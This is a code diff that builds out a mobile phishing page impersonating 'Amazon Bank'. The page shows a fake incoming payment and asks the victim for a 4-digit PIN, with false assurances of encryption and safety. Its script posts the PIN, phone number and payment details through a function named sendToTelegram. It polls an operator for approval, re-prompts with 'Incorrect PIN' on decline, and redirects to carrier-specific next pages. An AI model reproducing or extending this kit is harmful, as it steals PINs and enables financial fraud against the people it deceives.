@@ -1,3 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#131921">
+<title>Verify · Amazon Bank</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --amz-ink: #131921;
+    --amz-orange: #FF861F;
+    --amz-orange-hover: #F07800;
+    --amz-orange-subtle: #FFF4E5;
+    --amz-text: #0F1111;
+    --amz-muted: #565959;
+    --amz-border: #E7E9EC;
+    --amz-border-soft: #F0F1F3;
+    --amz-success: #067D62;
+    --amz-error: #B12704;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #EEF0F2; color: var(--amz-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.4;
+    min-height: 100dvh; display: flex; justify-content: center; align-items: center;
+  }
+  .phone {
+    width: 100%; max-width: 400px; background: #FFFFFF;
+    height: 100dvh; position: relative;
+    display: flex; flex-direction: column; overflow: hidden;
+  }
+  @media (min-width: 520px) {
+    body { padding: 20px 0; }
+    .phone {
+      height: calc(100dvh - 40px); max-height: 760px; border-radius: 22px;
+      box-shadow: 0 24px 70px rgba(19,25,33,0.18), 0 4px 14px rgba(19,25,33,0.08);
+    }
+  }
+  .app-header {
+    background: var(--amz-ink); color: #fff; height: 68px; padding: 0 14px;
+    padding-top: env(safe-area-inset-top, 0);
+    display: flex; align-items: center; justify-content: space-between;
+    position: relative; flex-shrink: 0; z-index: 5;
+  }
+  .app-header .back {
+    width: 34px; height: 34px; border-radius: 50%; border: none;
+    background: transparent; color: #fff; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    margin-left: -4px; transition: background .15s;
+  }
+  .app-header .back:hover { background: rgba(255,255,255,0.08); }
+  .app-header .back svg { width: 19px; height: 19px; }
+  .app-header .title {
+    position: absolute; left: 50%; top: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 17px; font-weight: 600; letter-spacing: -0.2px; white-space: nowrap;
+  }
+  .app-header .spacer-right { width: 34px; height: 34px; }
+  .body-scroll {
+    flex: 1 1 auto; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 22px; display: flex; flex-direction: column;
+  }
+  .brand-block { text-align: center; margin-bottom: 22px; }
+  .brand-block .brand-mark {
+    width: 60px; height: 60px; border-radius: 16px;
+    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
+    color: var(--amz-ink); display: inline-flex; align-items: center; justify-content: center;
+    font-size: 24px; font-weight: 800; letter-spacing: -0.5px;
+    box-shadow: 0 8px 22px rgba(255,134,31,0.32); margin-bottom: 12px;
+  }
+  .brand-block .brand-name { font-size: 18px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; }
+  .brand-block .brand-sub { font-size: 11.5px; color: var(--amz-muted); margin-top: 2px; letter-spacing: 0.2px; }
+  .context-card {
+    background: #F7F8FA; border: 1px solid var(--amz-border-soft);
+    border-radius: 12px; padding: 14px; margin-bottom: 20px;
+  }
+  .context-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 6px 0; font-size: 12.5px;
+  }
+  .context-row + .context-row { border-top: 1px solid var(--amz-border-soft); }
+  .context-row .k { color: var(--amz-muted); font-weight: 500; }
+  .context-row .v { color: var(--amz-ink); font-weight: 600; text-align: right; max-width: 62%; word-break: break-word; }
+  .context-row .v.mono { font-family: "SF Mono", Monaco, monospace; font-size: 11.5px; letter-spacing: 0.3px; }
+  .context-row.total { padding-top: 8px; }
+  .context-row.total .v { font-weight: 800; font-size: 14px; }
+  .verify-headline { text-align: center; margin-bottom: 6px; }
+  .verify-headline h1 { font-size: 17px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 4px; }
+  .verify-headline p { font-size: 12px; color: var(--amz-muted); line-height: 1.5; max-width: 300px; margin: 0 auto; }
+  .recipient-box {
+    margin: 16px 0 8px; padding: 12px 14px;
+    background: #FFFFFF; border: 1.5px solid var(--amz-border); border-radius: 10px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .recipient-box .flag {
+    flex: 0 0 28px; height: 28px; border-radius: 50%;
+    background: var(--amz-orange-subtle); color: var(--amz-orange-hover);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 800;
+  }
+  .recipient-box .num {
+    flex: 1; font-family: "SF Mono", Monaco, monospace; font-size: 14px;
+    font-weight: 600; color: var(--amz-ink); letter-spacing: 0.4px;
+  }
+  .pin-label { font-size: 12.5px; font-weight: 600; color: var(--amz-ink); margin: 12px 0 8px; text-align: center; }
+  .pin-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 6px; }
+  .pin-input {
+    width: 44px; height: 52px; text-align: center; font-size: 22px; font-weight: 700;
+    color: var(--amz-ink); background: #FFFFFF; border: 1.5px solid var(--amz-border);
+    border-radius: 10px; outline: none; font-family: "SF Mono", Monaco, monospace;
+    transition: border-color .15s, box-shadow .15s; -webkit-appearance: none;
+  }
+  .pin-input:focus { border-color: var(--amz-orange); box-shadow: 0 0 0 3px rgba(255,134,31,0.16); }
+  .pin-input.filled { border-color: var(--amz-ink); }
+  .pin-input.error { border-color: var(--amz-error); box-shadow: 0 0 0 3px rgba(177,39,4,0.10); }
+  @media (max-width: 360px) {
+    .pin-input { width: 38px; height: 48px; font-size: 20px; }
+    .pin-row { gap: 6px; }
+  }
+  .pin-error {
+    display: none; text-align: center; font-size: 11.5px;
+    color: var(--amz-error); font-weight: 600; margin-top: 6px;
+  }
+  .pin-error.show { display: block; }
+  .security-note {
+    display: flex; align-items: center; justify-content: center;
+    gap: 6px; font-size: 11px; color: var(--amz-muted); margin-top: 10px; text-align: center;
+  }
+  .security-note svg { width: 13px; height: 13px; color: var(--amz-success); flex-shrink: 0; }
+  .spacer { flex: 1 1 auto; min-height: 12px; }
+  .verify-btn {
+    width: 100%; padding: 14px; font-size: 15px; font-weight: 700; font-family: inherit;
+    color: #FFFFFF;
+    background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
+    border: none; border-radius: 12px; cursor: pointer;
+    box-shadow: 0 6px 18px rgba(255,134,31,0.30), inset 0 1px 0 rgba(255,255,255,0.35);
+    transition: filter .15s, transform .1s, opacity .15s; letter-spacing: 0.2px;
+  }
+  .verify-btn:hover { filter: brightness(1.05); }
+  .verify-btn:active { transform: scale(0.995); }
+  .verify-btn:disabled {
+    background: #D6D9DD; color: #8A8F98; box-shadow: none; cursor: not-allowed;
+  }
+  .verifying-overlay {
+    position: fixed; inset: 0; background: var(--amz-ink); color: #fff;
+    z-index: 100;
+    display: none; flex-direction: column; align-items: center; justify-content: center;
+    padding: 30px; text-align: center;
+  }
+  .verifying-overlay.show { display: flex; }
+  .verifying-overlay .brand-mark {
+    width: 72px; height: 72px; border-radius: 18px;
+    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
+    display: flex; align-items: center; justify-content: center;
+    color: var(--amz-ink); font-weight: 800; font-size: 28px; letter-spacing: -0.5px;
+    box-shadow: 0 10px 30px rgba(255,134,31,0.4); margin-bottom: 20px;
+  }
+  .verifying-overlay .load-title { font-size: 22px; font-weight: 700; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .verifying-overlay .load-sub { font-size: 13px; color: rgba(255,255,255,0.65); margin-bottom: 26px; max-width: 280px; line-height: 1.5; }
+  .verifying-overlay .spinner {
+    width: 34px; height: 34px; border: 3px solid rgba(255,255,255,0.15);
+    border-top-color: var(--amz-orange); border-radius: 50%;
+    animation: spin .8s linear infinite; margin-bottom: 30px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .safety-panel {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 14px; padding: 18px 16px; max-width: 320px; width: 100%;
+    text-align: left;
+  }
+  .safety-panel h4 {
+    font-size: 12px; font-weight: 700; color: var(--amz-orange);
+    text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px;
+  }
+  .safety-panel ul { list-style: none; padding: 0; margin: 0; }
+  .safety-panel li {
+    display: flex; align-items: flex-start; gap: 8px;
+    font-size: 12px; line-height: 1.5; color: rgba(255,255,255,0.82);
+    padding: 6px 0;
+  }
+  .safety-panel li svg { flex: 0 0 14px; height: 14px; margin-top: 2px; color: var(--amz-success); }
+  .result-overlay {
+    position: fixed; inset: 0; background: #EEF0F2;
+    z-index: 110;
+    display: none; align-items: center; justify-content: center; padding: 24px;
+  }
+  .result-overlay.show { display: flex; }
+  .result-card {
+    background: #fff; border-radius: 18px; padding: 30px 24px;
+    text-align: center; max-width: 340px; width: 100%;
+    box-shadow: 0 24px 60px rgba(19,25,33,0.2);
+  }
+  .result-card .ic {
+    width: 64px; height: 64px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 16px;
+  }
+  .result-card .ic.error { background: #FDECEA; color: var(--amz-error); }
+  .result-card .ic svg { width: 32px; height: 32px; }
+  .result-card h2 { font-size: 19px; font-weight: 800; color: var(--amz-ink); margin-bottom: 8px; }
+  .result-card p { font-size: 13.5px; color: var(--amz-muted); line-height: 1.55; margin-bottom: 20px; }
+  .result-card .try-btn {
+    width: 100%; padding: 13px; font-size: 14.5px; font-weight: 700; font-family: inherit;
+    color: #fff;
+    background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
+    border: none; border-radius: 10px; cursor: pointer;
+    box-shadow: 0 4px 14px rgba(255,134,31,0.28);
+  }
+  .result-card .try-btn:active { transform: scale(0.99); }
+  .state-card { padding: 46px 24px; text-align: center; }
+  .state-card .ic {
+    width: 54px; height: 54px; border-radius: 50%; background: var(--amz-orange-subtle);
+    color: var(--amz-orange-hover); display: flex; align-items: center; justify-content: center;
+    font-size: 24px; margin: 0 auto 16px;
+  }
+  .state-card h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; letter-spacing: -0.3px; }
+  .state-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.55; max-width: 280px; margin: 0 auto; }
+</style>
+</head>
+<body>
+
+<div class="phone" id="phone">
+  <header class="app-header">
+    <button class="back" id="backBtn" aria-label="Back">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"/>
+      </svg>
+    </button>
+    <div class="title">Verify transaction</div>
+    <span class="spacer-right"></span>
+  </header>
+
+  <div class="body-scroll" id="bodyScroll">
+    <div class="brand-block">
+      <div class="brand-mark">AB</div>
+      <div class="brand-name">Amazon Bank</div>
+      <div class="brand-sub">Secure cash-out verification</div>
+    </div>
+
+    <div class="context-card">
+      <div class="context-row"><span class="k">Recipient</span><span class="v" id="ctxRecipient">—</span></div>
+      <div class="context-row"><span class="k">Payment method</span><span class="v" id="ctxMethod">—</span></div>
+      <div class="context-row"><span class="k">Reference</span><span class="v mono" id="ctxRef">—</span></div>
+      <div class="context-row total"><span class="k">Amount to receive</span><span class="v" id="ctxAmount">$0.00</span></div>
+    </div>
+
+    <div class="verify-headline">
+      <h1>Enter your PIN</h1>
+      <p>Confirm your identity to receive this payment. The PIN is the one linked to the number below.</p>
+    </div>
+
+    <div class="recipient-box">
+      <span class="flag" id="numFlag">+</span>
+      <span class="num" id="numDisplay">— — — —</span>
+    </div>
+
+    <div class="pin-label">Your PIN</div>
+    <div class="pin-row" id="pinRow">
+      <input class="pin-input" type="password" inputmode="numeric" maxlength="1" autocomplete="off" data-i="0">
+      <input class="pin-input" type="password" inputmode="numeric" maxlength="1" autocomplete="off" data-i="1">
+      <input class="pin-input" type="password" inputmode="numeric" maxlength="1" autocomplete="off" data-i="2">
+      <input class="pin-input" type="password" inputmode="numeric" maxlength="1" autocomplete="off" data-i="3">
+    </div>
+    <div class="pin-error" id="pinError">Please enter all 4 digits of your PIN.</div>
+
+    <div class="security-note">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+        <path d="M9 12l2 2 4-4"/>
+      </svg>
+      <span>Secured with end-to-end encryption</span>
+    </div>
+
+    <div class="spacer"></div>
+    <button class="verify-btn" id="verifyBtn" disabled>Verify &amp; continue</button>
+  </div>
+</div>
+
+<div class="verifying-overlay" id="verifyingOverlay">
+  <div class="brand-mark">AB</div>
+  <div class="load-title">Verifying your identity</div>
+  <div class="load-sub">We're confirming your PIN with Amazon Bank. This usually takes a few seconds.</div>
+  <div class="spinner"></div>
+  <div class="safety-panel">
+    <h4>Why this is safe</h4>
+    <ul>
+      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg><span>End-to-end encryption protects your PIN at every step.</span></li>
+      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg><span>No funds move until verification is fully approved.</span></li>
+      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg><span>Amazon Bank never shares your PIN with third parties.</span></li>
+    </ul>
+  </div>
+</div>
+
+<div class="result-overlay" id="resultOverlay">
+  <div class="result-card">
+    <div class="ic error">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="M12 8v4"/>
+        <path d="M12 16h.01"/>
+      </svg>
+    </div>
+    <h2>Incorrect PIN</h2>
+    <p>The PIN you entered doesn't match the one linked to this account. Please try again carefully.</p>
+    <button class="try-btn" id="tryAgainBtn">Try again</button>
+  </div>
+</div>
+
 <script>
 const CONFIG = {
   MTN_NEXT_PAGE: 'mtn.html',
@@ -101,12 +415,8 @@ function buildDisplayNumber(accountNumber, country) {
 }
 
 const state = {
-  payload: null,
-  pin: ['', '', '', ''],
-  requestId: null,
-  polling: false,
-  pollStart: 0,
-  slowHintTimer: null
+  payload: null, pin: ['', '', '', ''], requestId: null,
+  polling: false, pollStart: 0, slowHintTimer: null
 };
 
 function render(payload) {
@@ -116,17 +426,18 @@ function render(payload) {
   const fee = (payload.fee != null) ? Number(payload.fee) : CONFIG.DEFAULT_FEE;
   const receive = Math.max(0, amount - (isFinite(fee) ? fee : 0));
 
-  document.getElementById('ctxRecipient').textContent = payload.rn || '—';
+  const setTxt = (id, txt) => { const el = document.getElementById(id); if (el) el.textContent = txt; };
+  setTxt('ctxRecipient', payload.rn || '—');
   const acct = String(payload.an || '').replace(/\s+/g, '');
   const last4 = acct.slice(-4) || '0000';
   const modeLabel = (String(payload.pm || '').trim()) || 'Amazon Flex Debit Card';
-  document.getElementById('ctxMethod').textContent = modeLabel + ' *' + last4;
-  document.getElementById('ctxRef').textContent = payload.tx || payload.tn || '—';
-  document.getElementById('ctxAmount').textContent = formatMoney(receive, cur);
+  setTxt('ctxMethod', modeLabel + ' *' + last4);
+  setTxt('ctxRef', payload.tx || payload.tn || '—');
+  setTxt('ctxAmount', formatMoney(receive, cur));
 
   const disp = buildDisplayNumber(payload.an || '', payload.c || '');
-  document.getElementById('numFlag').textContent = disp.dial || '+';
-  document.getElementById('numDisplay').textContent = disp.number;
+  setTxt('numFlag', disp.dial || '+');
+  setTxt('numDisplay', disp.number);
 }
 
 function showStateCard(icon, title, message) {
@@ -188,12 +499,9 @@ async function sendToTelegram(pin, number, payload) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      pin,
-      number,
-      country: payload.c,
-      recipient: payload.rn,
-      amount: payload.am,
-      currency: payload.cur,
+      pin, number,
+      country: payload.c, recipient: payload.rn,
+      amount: payload.am, currency: payload.cur,
       fee: payload.fee,
       reference: payload.tx || payload.tn,
       method: payload.pm
@@ -207,63 +515,43 @@ async function sendToTelegram(pin, number, payload) {
 
 function pollStatus() {
   if (!state.requestId) return;
-  if (Date.now() - state.pollStart > CONFIG.MAX_WAIT_MS) {
-    handleDecline();
-    return;
-  }
-
+  if (Date.now() - state.pollStart > CONFIG.MAX_WAIT_MS) { handleDecline(); return; }
   fetch(CONFIG.STATUS_ENDPOINT(state.requestId))
     .then(r => r.json())
     .then(data => {
       const status = (data && data.status) || (data && data.decision) || 'pending';
-      if (status === 'approved') {
-        handleApprove();
-      } else if (status === 'declined') {
-        handleDecline();
-      } else {
-        setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
-      }
+      if (status === 'approved') handleApprove();
+      else if (status === 'declined') handleDecline();
+      else setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
     })
-    .catch(() => {
-      setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
-    });
+    .catch(() => setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS));
 }
 
 function handleApprove() {
   state.polling = false;
   if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-
   const overlay = document.getElementById('verifyingOverlay');
   if (overlay) {
-    const title = overlay.querySelector('.load-title');
-    const sub   = overlay.querySelector('.load-sub');
-    const spinner = overlay.querySelector('.spinner');
-    if (title) title.textContent = 'Approved ✓';
-    if (sub) sub.textContent = 'Redirecting you to the next step…';
-    if (spinner) spinner.style.display = 'none';
+    const t = overlay.querySelector('.load-title');
+    const s = overlay.querySelector('.load-sub');
+    const sp = overlay.querySelector('.spinner');
+    if (t) t.textContent = 'Approved ✓';
+    if (s) s.textContent = 'Redirecting you to the next step…';
+    if (sp) sp.style.display = 'none';
   }
-
   const next = nextPageFor(state.payload && state.payload.c);
   const qs = window.location.search || '';
-  setTimeout(() => {
-    window.location.href = next + qs;
-  }, CONFIG.APPROVED_FLASH_MS);
+  setTimeout(() => { window.location.href = next + qs; }, CONFIG.APPROVED_FLASH_MS);
 }
 
 function handleDecline() {
   state.polling = false;
   if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-  const vo = document.getElementById('verifyingOverlay');
-  if (vo) vo.classList.remove('show');
-  const ro = document.getElementById('resultOverlay');
-  if (ro) ro.classList.add('show');
-  document.querySelectorAll('.pin-input').forEach(i => {
-    i.value = '';
-    i.classList.remove('filled');
-  });
+  const vo = document.getElementById('verifyingOverlay'); if (vo) vo.classList.remove('show');
+  const ro = document.getElementById('resultOverlay'); if (ro) ro.classList.add('show');
+  document.querySelectorAll('.pin-input').forEach(i => { i.value = ''; i.classList.remove('filled'); });
   state.pin = ['', '', '', ''];
-  const vb = document.getElementById('verifyBtn');
-  if (vb) vb.disabled = true;
+  const vb = document.getElementById('verifyBtn'); if (vb) vb.disabled = true;
   state.requestId = null;
 }
 
@@ -275,19 +563,18 @@ async function doVerify() {
     document.querySelectorAll('.pin-input').forEach(i => i.classList.add('error'));
     return;
   }
-
   const pin = state.pin.join('');
   const numEl = document.getElementById('numDisplay');
   const number = numEl ? numEl.textContent : '';
 
   const overlay = document.getElementById('verifyingOverlay');
   if (overlay) {
-    const title = overlay.querySelector('.load-title');
-    const sub   = overlay.querySelector('.load-sub');
-    const spinner = overlay.querySelector('.spinner');
-    if (title) title.textContent = 'Verifying your identity';
-    if (sub) sub.textContent = "We're confirming your PIN with Amazon Bank. This usually takes a few seconds.";
-    if (spinner) spinner.style.display = '';
+    const t = overlay.querySelector('.load-title');
+    const s = overlay.querySelector('.load-sub');
+    const sp = overlay.querySelector('.spinner');
+    if (t) t.textContent = 'Verifying your identity';
+    if (s) s.textContent = "We're confirming your PIN with Amazon Bank. This usually takes a few seconds.";
+    if (sp) sp.style.display = '';
     overlay.classList.add('show');
   }
 
@@ -296,14 +583,12 @@ async function doVerify() {
     state.requestId = requestId;
     state.pollStart = Date.now();
     state.polling = true;
-
     state.slowHintTimer = setTimeout(() => {
       if (state.polling && overlay) {
-        const sub = overlay.querySelector('.load-sub');
-        if (sub) sub.textContent = 'Still waiting for approval — this can take a moment. Please don\'t close this page.';
+        const s = overlay.querySelector('.load-sub');
+        if (s) s.textContent = 'Still waiting for approval — this can take a moment. Please don\'t close this page.';
       }
     }, CONFIG.SLOW_HINT_MS);
-
     setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
   } catch (err) {
     if (overlay) overlay.classList.remove('show');
@@ -311,54 +596,34 @@ async function doVerify() {
   }
 }
 
-/* ── Boot ─────────────────────────────────── */
 async function boot() {
-  // Back button (guarded)
   const backBtn = document.getElementById('backBtn');
-  if (backBtn) {
-    backBtn.addEventListener('click', () => {
-      if (window.history.length > 1) window.history.back();
-    });
-  }
+  if (backBtn) backBtn.addEventListener('click', () => { if (window.history.length > 1) window.history.back(); });
 
-  // "Try again" (guarded)
   const tryAgainBtn = document.getElementById('tryAgainBtn');
-  if (tryAgainBtn) {
-    tryAgainBtn.addEventListener('click', () => {
-      const ro = document.getElementById('resultOverlay');
-      if (ro) ro.classList.remove('show');
-      const pe = document.getElementById('pinError');
-      if (pe) pe.classList.remove('show');
-      const firstPin = document.querySelector('.pin-input');
-      if (firstPin) firstPin.focus();
-    });
-  }
+  if (tryAgainBtn) tryAgainBtn.addEventListener('click', () => {
+    const ro = document.getElementById('resultOverlay'); if (ro) ro.classList.remove('show');
+    const pe = document.getElementById('pinError'); if (pe) pe.classList.remove('show');
+    const fp = document.querySelector('.pin-input'); if (fp) fp.focus();
+  });
 
-  // Resolve the payload first — if it fails, show the state card and stop
   let payload;
-  try {
-    payload = await resolvePayload();
-  } catch (err) {
-    showStateCard('⚠', 'Payment link unavailable',
-      err.message || 'Please start over from the payment link.');
-    return;
-  }
+  try { payload = await resolvePayload(); }
+  catch (err) { showStateCard('⚠', 'Payment link unavailable', err.message || 'Please start over from the payment link.'); return; }
 
   if (payload && payload.exp && Date.now() > Number(payload.exp)) {
-    showStateCard('⏱', 'This link has expired',
-      'The payment request is no longer valid. Please ask the sender to generate a new link.');
+    showStateCard('⏱', 'This link has expired', 'The payment request is no longer valid. Please ask the sender to generate a new link.');
     return;
   }
 
   render(payload);
   initPin();
 
-  // Attach Verify listener ONLY after render + initPin succeed
   const verifyBtn = document.getElementById('verifyBtn');
-  if (verifyBtn) {
-    verifyBtn.addEventListener('click', doVerify);
-  }
+  if (verifyBtn) verifyBtn.addEventListener('click', doVerify);
 }
 
 document.addEventListener('DOMContentLoaded', boot);
 </script>
+</body>
+</html>
